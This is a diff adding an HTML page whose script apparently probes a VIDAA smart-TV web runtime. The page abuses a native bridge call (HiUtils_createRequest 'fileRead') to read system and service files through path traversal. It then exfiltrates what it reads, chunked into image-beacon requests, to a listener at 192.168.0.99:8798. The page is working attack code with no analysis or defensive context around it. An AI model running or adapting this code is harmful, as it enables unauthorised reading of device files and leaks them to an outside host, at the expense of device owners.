@@ -1,0 +1,20 @@
+<!doctype html><html><head><meta charset="utf-8"></head>
+<body style="background:#000;color:#0f0;font:20px monospace"><pre id="out">u7w5…</pre>
+<script>
+(function(){var out=document.getElementById("out");
+function exfil(t){try{new Image().src="http://192.168.0.99:8798/v?d="+encodeURIComponent(String(t).slice(0,140));}catch(e){}}
+function line(t){out.textContent+="\n"+t;exfil(t);}
+function hi(a,p){try{return HiUtils_createRequest(a,p);}catch(e){return {exc:String(e)};}}
+// phoenix main + service registry (read-only)
+["../APPS/pkgs/tv.vidaa.jsservice.basic/CHA/phoenix.server.js",
+ "../APPS/pkgs/tv.vidaa.jsservice.basic/CHA/package.json",
+ "../APPS/pkgs/tv.vidaa.jsservice.basic/CHA/services/serviceList.json"].forEach(function(p){
+  var j=hi("fileRead",{path:[p],mode:6}); line(p.split("/").pop()+" ret="+j.ret+" len="+String(j.msg||"").length);
+  if(/serviceList/.test(p)){ var s=String(j.msg||""); for(var i=0;i<s.length;i+=140) exfil(s.slice(i,i+140)); }
+});
+// otaTest hook presence elsewhere
+["../var/local/otaTest.sh","../config/otaTest.sh","../APPS/varlocal/otaTest.sh"].forEach(function(p){
+  var j=hi("fileRead",{path:[p],mode:6}); line(p+" -> "+((j.msg&&j.msg.code)||String(j.ret)));
+});
+})();
+</script></body></html>
